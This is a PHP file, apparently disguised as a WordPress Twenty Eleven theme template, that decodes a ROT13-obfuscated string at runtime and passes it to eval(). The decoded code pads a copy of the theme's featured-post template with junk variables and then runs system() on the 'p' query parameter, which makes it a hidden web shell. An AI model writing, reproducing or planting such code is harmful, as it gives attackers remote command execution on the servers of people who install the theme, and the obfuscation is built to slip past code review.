<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grzcyngr sbe qvfcynlvat pbagrag srngherq va gur fubjpnfr.cuc cntr grzcyngr
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Ryrira
 * @fvapr Gjragl Ryrira 1.0
 */

tybony $srngher_pynff;
?>
<negvpyr vq=\"cbfg-<?cuc gur_VQ(); ?>\" <?cuc cbfg_pynff( $srngher_pynff ); ?>>
	<urnqre pynff=\"ragel-urnqre\">
		<u2 pynff=\"ragel-gvgyr\"><n uers=\"<?cuc gur_creznyvax(); ?>\" ery=\"obbxznex\"><?cuc gur_gvgyr(); ?></n></u2>

		<qvi pynff=\"ragel-zrgn\">
			<?cuc gjraglryrira_cbfgrq_ba(); ?>
		</qvi><!-- .ragel-zrgn -->
	</urnqre><!-- .ragel-urnqre -->

	<qvi pynff=\"ragel-fhzznel\">
		<?cuc gur_rkprecg(); ?>
		<?cuc
		jc_yvax_cntrf(
			neenl(
				'orsber' => '<qvi pynff=\"cntr-yvax\"><fcna>' . __( 'Cntrf:', 'gjraglryrira' ) . '</fcna>',
				'nsgre'  => '</qvi>',
			)
		);
		?>
	</qvi><!-- .ragel-pbagrag -->

	<sbbgre pynff=\"ragel-zrgn\">
		<?cuc
		$gntf_yvfg = trg_gur_gnt_yvfg( '', jc_trg_yvfg_vgrz_frcnengbe() );

		vs ( $gntf_yvfg && ! vf_jc_reebe( $gntf_yvfg ) ) {
			/* genafyngbef: 1: Pngrtbel yvfg, 2: Gnt yvfg, 3: Cbfg creznyvax, 4: Cbfg gvgyr. */
			$hgvyvgl_grkg = __( 'Guvf ragel jnf cbfgrq va %1$f naq gnttrq %2$f. Obbxznex gur <n uers=\"%3$f\" gvgyr=\"Creznyvax gb %4$f\" ery=\"obbxznex\">creznyvax</n>.', 'gjraglryrira' );
		} ryfr {
			/* genafyngbef: 1: Pngrtbel yvfg, 3: Cbfg creznyvax, 4: Cbfg gvgyr. */
			$hgvyvgl_grkg = __( 'Guvf ragel jnf cbfgrq va %1$f. Obbxznex gur <n uers=\"%3$f\" gvgyr=\"Creznyvax gb %4$f\" ery=\"obbxznex\">creznyvax</n>.', 'gjraglryrira' );
		}

		cevags(
			$hgvyvgl_grkg,
			trg_gur_pngrtbel_yvfg( jc_trg_yvfg_vgrz_frcnengbe() ),
			$gntf_yvfg,
			rfp_hey( trg_creznyvax() ),
			gur_gvgyr_nggevohgr( 'rpub=0' )
		);
		?>

		<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglryrira' ), '<fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
	</sbbgre><!-- .ragel-zrgn -->
</negvpyr><!-- #cbfg-<?cuc gur_VQ(); ?> -->

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>